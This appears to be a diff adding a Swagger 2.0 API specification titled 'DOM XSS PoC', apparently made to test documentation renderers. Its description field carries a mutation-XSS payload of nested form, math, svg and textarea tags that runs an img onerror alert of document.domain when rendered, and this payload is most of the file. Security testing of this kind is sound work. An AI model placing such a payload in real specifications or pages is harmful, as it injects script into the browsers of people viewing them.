@@ -1,0 +1,13 @@
+---
+swagger: "2.0"
+info:
+  version: 0.0.1
+  title: DOM XSS PoC
+  description: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path
+    id="</textarea><img onerror=alert(document.domain) src=1>"></form>
+paths:
+  /:
+    get:
+      responses:
+        "200":
+          description: Success
